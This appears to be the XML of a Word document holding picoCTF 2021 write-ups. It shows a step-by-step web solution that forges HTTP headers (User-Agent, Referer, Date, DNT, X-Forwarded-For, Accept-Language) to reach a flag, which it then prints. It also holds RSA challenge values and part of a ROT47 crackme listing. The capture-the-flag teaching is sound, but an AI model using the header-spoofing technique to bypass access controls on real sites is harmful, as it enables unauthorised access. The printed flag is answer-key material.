        </w:rPr>
        <w:t>Description</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0C6E777B" w14:textId="06FFC481" w:rsidR="00A226E0" w:rsidRDefault="00A226E0" w:rsidP="00A226E0">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00A226E0">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t xml:space="preserve">Let me in. Let me iiiiiiinnnnnnnnnnnnnnnnnnnn </w:t>
      </w:r>
      <w:hyperlink r:id="rId75" w:history="1">
        <w:r w:rsidR="00BE6C96" w:rsidRPr="001B2A6B">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:lang w:val="en-CA"/>
          </w:rPr>
          <w:t>http://mercury.picoctf.net:1270/</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="73C9C16D" w14:textId="77777777" w:rsidR="00BE6C96" w:rsidRDefault="00BE6C96" w:rsidP="00BE6C96">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
        <w:spacing w:before="0" w:line="540" w:lineRule="atLeast"/>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="Times New Roman" w:hAnsi="Helvetica"/>
          <w:color w:val="333333"/>
          <w:sz w:val="45"/>
          <w:szCs w:val="45"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Strong"/>
          <w:rFonts w:ascii="Helvetica" w:hAnsi="Helvetica"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="333333"/>
          <w:sz w:val="45"/>
          <w:szCs w:val="45"/>
        </w:rPr>
        <w:t>Presentation</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1E0E6504"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objective is to pretend to be a user who is accepted by the site to obtain the page with the flag.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="29460C04"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Flaw to be exploited</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7F47CCD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flaw exploited is in the HTTP request, and more precisely in the headers thereof, which we send to the server that we can modify and which allows us to access the different pages.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="00896631"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Solution</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="32220772"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solution is divided into several steps.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5E84693E"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1</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="18C66A25"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When we launch the challenge we arrive on this page.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0EE2DDEB" w14:textId="1D5B1D16"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5057AB98" wp14:editId="6CDE0B0F">
            <wp:extent cx="6332220" cy="52260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06836F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Note that only people coming from an official browser can access the real site. We must therefore modify the header "User-Agent". </w:t>
      </w:r>
      <w:hyperlink r:id="rId77"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We therefore replace the value by : </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="DD1144"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
          <w:bdr w:val="single" w:sz="6" w:space="2" w:color="E1E1E8" w:frame="1"/>
          <w:shd w:val="clear" w:color="auto" w:fill="F7F7F9"/>
        </w:rPr>
        <w:t>User-Agent: PicoBrowser</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2912981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2</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4960D6A9"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After the first part we arrive on this page:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2317EF5B" w14:textId="55084698"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4E5EB604" wp14:editId="69D2BF78">
            <wp:extent cx="4198620" cy="51206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8620" cy="5120640"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="6846475B"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users coming from other sites. So we need to add the header :"Refer". </w:t>
      </w:r>
      <w:hyperlink r:id="rId7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put this value : </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="DD1144"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
          <w:bdr w:val="single" w:sz="6" w:space="2" w:color="E1E1E8" w:frame="1"/>
          <w:shd w:val="clear" w:color="auto" w:fill="F7F7F9"/>
        </w:rPr>
        <w:t>Referer: http://mercury.picoctf.net:36622/</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6B2C4AF8"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3</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1D44EEED"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So we come to this page :</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="788EC40C" w14:textId="2DEE5704"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279A274" wp14:editId="470BE21D">
            <wp:extent cx="4137660" cy="520446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7660" cy="5204460"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="18040B4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are told that the site only works in 2018. So let's add the following header : "Date". </w:t>
      </w:r>
      <w:hyperlink r:id="rId81"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give it a date in 2018 like this : </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="DD1144"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
          <w:bdr w:val="single" w:sz="6" w:space="2" w:color="E1E1E8" w:frame="1"/>
          <w:shd w:val="clear" w:color="auto" w:fill="F7F7F9"/>
        </w:rPr>
        <w:t>Date: Wed, 21 Oct 2018 07:28:00 GMT</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6E3173A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4</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7A2E340A"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Once the request is sent this page appears :</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="598F5F57" w14:textId="3B2B5FA5"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F59FE4E" wp14:editId="6B692132">
            <wp:extent cx="4122420" cy="51511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2420" cy="5151120"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="6C49623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the users who are being stalked. Let's add the following header : "DNT" </w:t>
      </w:r>
      <w:hyperlink r:id="rId83"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Insert this command in your request : </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="DD1144"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
          <w:bdr w:val="single" w:sz="6" w:space="2" w:color="E1E1E8" w:frame="1"/>
          <w:shd w:val="clear" w:color="auto" w:fill="F7F7F9"/>
        </w:rPr>
        <w:t>DNT: 1</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="564AFC54"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5</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="15BEFCA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time the site brings us to this page :</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5AEF8036" w14:textId="6BD58A33"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A7DB8B9" wp14:editId="2E075F08">
            <wp:extent cx="5516880" cy="488442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6880" cy="4884420"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="311686E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accepts people from Sweden. We will therefore add the following header : "X-Forwarded-For" </w:t>
      </w:r>
      <w:hyperlink r:id="rId8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You also need to find an IP address from Sweden. I found one here : </w:t>
      </w:r>
      <w:hyperlink r:id="rId86" w:history="1">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:rFonts w:ascii="Helvetica" w:hAnsi="Helvetica"/>
            <w:color w:val="0088CC"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>Adresse ip from Sweden</w:t>
        </w:r>
      </w:hyperlink>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:hAnsi="Helvetica"/>
          <w:color w:val="333333"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t> And we get a header like this : </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="DD1144"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
          <w:bdr w:val="single" w:sz="6" w:space="2" w:color="E1E1E8" w:frame="1"/>
          <w:shd w:val="clear" w:color="auto" w:fill="F7F7F9"/>
        </w:rPr>
        <w:t>X-Forwarded-For: 31.3.152.55</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="48418230"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6</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="142C4F7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Finally we arrive on this page:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="02F174E1" w14:textId="59283D5F"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34246880" wp14:editId="23B10562">
            <wp:extent cx="4160520" cy="509778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60520" cy="5097780"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="041D9DC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wants us to speak Swedish to be able to access the last part. We are therefore going to modify the following header : "Accept-Language" </w:t>
      </w:r>
      <w:hyperlink r:id="rId88"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And let's put it the following value : </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="DD1144"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
          <w:bdr w:val="single" w:sz="6" w:space="2" w:color="E1E1E8" w:frame="1"/>
          <w:shd w:val="clear" w:color="auto" w:fill="F7F7F9"/>
        </w:rPr>
        <w:t>Accept-Language: sv,en;q=0.9</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7F39A990" w14:textId="77777777" w:rsidR="00BE6C96" w:rsidRDefault="00BE6C96" w:rsidP="00BE6C96">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
        <w:spacing w:before="0" w:line="540" w:lineRule="atLeast"/>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:hAnsi="Helvetica"/>
          <w:color w:val="333333"/>
          <w:sz w:val="45"/>
          <w:szCs w:val="45"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:hAnsi="Helvetica"/>
          <w:color w:val="333333"/>
          <w:sz w:val="45"/>
          <w:szCs w:val="45"/>
        </w:rPr>
        <w:t>Conclusion</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="622AEFD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challenge is relatively simple once you know where you have to operate the site. The rest is just research versus what the site tells us. Hoping that this could help you ;)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="243FE37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If you liked this writeup you can check our github with this </w:t>
      </w:r>
      <w:hyperlink r:id="rId89" w:history="1">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:rFonts w:ascii="Helvetica" w:hAnsi="Helvetica"/>
            <w:color w:val="0088CC"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>link</w:t>
        </w:r>
      </w:hyperlink>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:hAnsi="Helvetica"/>
          <w:color w:val="333333"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t> and star our repository.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3E2B07F5" w14:textId="44E607A3" w:rsidR="00BE6C96" w:rsidRDefault="00BE6C96" w:rsidP="00A226E0">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="47BFC371" w14:textId="1B29A8C4" w:rsidR="00BE6C96" w:rsidRDefault="00BE6C96" w:rsidP="00A226E0">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00BE6C96">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>picoCTF{http_h34d3rs_v3ry_c0Ol_much_w0w_f56f58a5}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="283C37C1" w14:textId="7CC6EFED" w:rsidR="00BE6C96" w:rsidRDefault="00BE6C96" w:rsidP="00A226E0">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="76EF575F" w14:textId="56F7D684" w:rsidR="00BE6C96" w:rsidRDefault="00BE6C96" w:rsidP="00A226E0">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7CED5B4B" w14:textId="38D4482E" w:rsidR="00BE6C96" w:rsidRDefault="00BE6C96" w:rsidP="00A226E0">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="42E1D0F9" w14:textId="6C1AA623" w:rsidR="00BE6C96" w:rsidRDefault="00BE6C96" w:rsidP="00A226E0">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="55648A12" w14:textId="0D11AA09" w:rsidR="00BE6C96" w:rsidRDefault="00BE6C96" w:rsidP="00A226E0">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="79B4D868" w14:textId="77777777" w:rsidR="00BE6C96" w:rsidRDefault="00BE6C96" w:rsidP="00A226E0">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3D427312" w14:textId="0D935C10" w:rsidR="00BE6C96" w:rsidRDefault="00BE6C96" w:rsidP="00A226E0">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="0DC04C97" wp14:editId="2546F79A">
            <wp:extent cx="4892464" cy="3779848"/>
            <wp:effectExtent l="0" t="0" r="381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90"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="4892464" cy="3779848"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="693F819D" w14:textId="445C5FE4" w:rsidR="00BE6C96" w:rsidRDefault="00BE6C96" w:rsidP="00A226E0">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5DA1DFAC" w14:textId="4F9FF34D" w:rsidR="00BE6C96" w:rsidRDefault="00BE6C96" w:rsidP="00BE6C9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Mind your Ps and Qs</w:t>
      </w:r>
      <w:r w:rsidR="00E45D20">
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:cs="Open Sans"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="1D253B"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00E45D20">
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:cs="Open Sans"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="FF0000"/>
        </w:rPr>
        <w:t>HARD</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="260EA80C"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 | 20 points</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1B5190AE"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2021Cryptography</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="23281F28" w14:textId="77777777" w:rsidR="00BE6C96" w:rsidRDefault="00BE6C96" w:rsidP="00BE6C9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SARA</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="554000FF" w14:textId="77777777" w:rsidR="00BE6C96" w:rsidRDefault="00BE6C96" w:rsidP="00BE6C9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3730AB6" w14:textId="77777777" w:rsidR="00BE6C96" w:rsidRDefault="00BE6C96" w:rsidP="00BE6C9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In RSA, a small </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="F3A4B5"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans" w:cs="Open Sans"/>
          <w:color w:val="222A42"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
        <w:t> value can be problematic, but what about </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="F3A4B5"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>N</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans" w:cs="Open Sans"/>
          <w:color w:val="222A42"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
        <w:t>? Can you decrypt this? </w:t>
      </w:r>
      <w:hyperlink r:id="rId91" w:tgtFrame="_blank" w:history="1">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans" w:cs="Open Sans"/>
            <w:color w:val="5969F6"/>
            <w:sz w:val="27"/>
            <w:szCs w:val="27"/>
          </w:rPr>
          <w:t>values</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="75132E2B" w14:textId="77777777" w:rsidR="001F4DD4" w:rsidRPr="001F4DD4" w:rsidRDefault="001F4DD4" w:rsidP="001F4DD4">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="001F4DD4">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>Decrypt my super sick RSA:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7BDF2A4B" w14:textId="77777777" w:rsidR="001F4DD4" w:rsidRPr="001F4DD4" w:rsidRDefault="001F4DD4" w:rsidP="001F4DD4">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="001F4DD4">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>c: 62324783949134119159408816513334912534343517300880137691662780895409992760262021</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3B66770F" w14:textId="77777777" w:rsidR="001F4DD4" w:rsidRPr="001F4DD4" w:rsidRDefault="001F4DD4" w:rsidP="001F4DD4">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="001F4DD4">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>n: 1280678415822214057864524798453297819181910621573945477544758171055968245116423923</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="26D79156" w14:textId="3C681149" w:rsidR="00BE6C96" w:rsidRDefault="001F4DD4" w:rsidP="001F4DD4">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="001F4DD4">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>e: 65537</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7F6BE406" w14:textId="23701751" w:rsidR="001F4DD4" w:rsidRDefault="001F4DD4" w:rsidP="001F4DD4">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t xml:space="preserve">RSA </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1E3B4862" w14:textId="635495CA" w:rsidR="001F4DD4" w:rsidRDefault="001F4DD4" w:rsidP="001F4DD4">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="325E7632" w14:textId="77777777" w:rsidR="001F4DD4" w:rsidRDefault="001F4DD4" w:rsidP="001F4DD4">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crackme-py</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6CE91CAD"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45FE01BF"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2021Reverse Engineering</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3C95E19E" w14:textId="77777777" w:rsidR="001F4DD4" w:rsidRDefault="001F4DD4" w:rsidP="001F4DD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5CFD2D15" w14:textId="77777777" w:rsidR="001F4DD4" w:rsidRDefault="001F4DD4" w:rsidP="001F4DD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B771CA" w14:textId="553428BE" w:rsidR="001F4DD4" w:rsidRDefault="00000000" w:rsidP="001F4DD4">
      <w:pPr>
        <w:pStyle w:val="body-md"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="75" w:afterAutospacing="0"/>
        <w:rPr>
          <w:rStyle w:val="Hyperlink"/>
          <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans" w:cs="Open Sans"/>
          <w:color w:val="5969F6"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink r:id="rId92" w:tgtFrame="_blank" w:history="1">
        <w:r w:rsidR="001F4DD4">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans" w:cs="Open Sans"/>
            <w:color w:val="5969F6"/>
            <w:sz w:val="27"/>
            <w:szCs w:val="27"/>
          </w:rPr>
          <w:t>crackme.py</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="4D0BDBB0" w14:textId="5AF7C088"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DA21A30" w14:textId="7ED39C25"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76EDCB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Hiding this really important number in an obscure piece of code is brilliant!</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1BA5DC8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AND it's encrypted!</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4508E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We want our biggest client to know his information is safe with us.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="01BB14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bezos_cc_secret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"A:4@r</w:t>
      </w:r>
      <w:r w:rsidRPr="007D5169">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Times New Roman"/>
          <w:color w:val="569CD6"/>
          <w:kern w:val="0"/>
          <w:lang w:val="en-CA" w:bidi="ar-SA"/>
        </w:rPr>
        <w:t>%u</w:t>
      </w:r>
      <w:r w:rsidRPr="007D5169">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Times New Roman"/>
          <w:color w:val="CE9178"/>
          <w:kern w:val="0"/>
          <w:lang w:val="en-CA" w:bidi="ar-SA"/>
        </w:rPr>
        <w:t>L`M-^M0c0AbcM-MFE055a4ce`eN"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="010DCA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090F9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Reference alphabet</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3648E93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#$%&amp;'()*+,-./0123456789:;&lt;=&gt;?@ABCDEFGHIJKLMNOPQRSTUVWXYZ"</w:t>
      </w:r>
      <w:r w:rsidRPr="007D5169">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Times New Roman"/>
          <w:color w:val="D4D4D4"/>
          <w:kern w:val="0"/>
          <w:lang w:val="en-CA" w:bidi="ar-SA"/>
        </w:rPr>
        <w:t>+ \</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="26276FB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]^_`abcdefghijklmnopqrstuvwxyz{|}~"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="51F50316"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3F8453C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decode_secret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528E217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"""ROT47 decode</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="31A723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740FB1C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xml:space="preserve">    </w:t>
      </w:r>
      <w:r w:rsidRPr="007D5169">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Times New Roman"/>
          <w:color w:val="569CD6"/>
          <w:kern w:val="0"/>
          <w:lang w:val="en-CA" w:bidi="ar-SA"/>
        </w:rPr>
        <w:t>NOTE</w:t>
      </w:r>
      <w:r w:rsidRPr="007D5169">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Times New Roman"/>
          <w:color w:val="CE9178"/>
          <w:kern w:val="0"/>
          <w:lang w:val="en-CA" w:bidi="ar-SA"/>
        </w:rPr>
        <w:t>: encode and decode are the same operation in the ROT cipher family.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="19251A8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3F76ABA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6A3982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Encryption key</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0D12023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rotate_const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B5CEA8"/>
          <w:kern w:val="0"/>
          <w:lang w:val="en-CA" w:bidi="ar-SA"/>
        </w:rPr>
        <w:t>47</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="06ECBCB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310C1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Storage for decoded secret</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="74DD13F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p>
    <w:p w14:paraId="605490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733870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decode loop</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7ECFA3F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for</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in</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7ED2B3D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DCDCAA"/>
          <w:kern w:val="0"/>
          <w:lang w:val="en-CA" w:bidi="ar-SA"/>
        </w:rPr>
        <w:t>find</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w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="744B23D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original_index</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rotate_const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len</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
    <w:p w14:paraId="01AAC10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original_index</w:t>
      </w:r>
      <w:r w:rsidRPr="007D5169">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Times New Roman"/>
          <w:color w:val="D4D4D4"/>
          <w:kern w:val="0"/>
          <w:lang w:val="en-CA" w:bidi="ar-SA"/>
        </w:rPr>
        <w:t>]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0EBB0B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8B0045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w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="53A383BA"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lastRenderedPageBreak/>
        <w:br/>
      </w:r>
    </w:p>
    <w:p w14:paraId="430155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choose_greatest</w:t>
      </w:r>
      <w:r w:rsidRPr="007D5169">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Times New Roman"/>
          <w:color w:val="D4D4D4"/>
          <w:kern w:val="0"/>
          <w:lang w:val="en-CA" w:bidi="ar-SA"/>
        </w:rPr>
        <w:t>():</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="253FD4C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"""Echo the largest of the two numbers given by the user to the program</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1CD228A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56EC3D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Warning: this function was written quickly and needs proper error handling</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="455C174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78F4CDA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6282BD4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first number? "</w:t>
      </w:r>
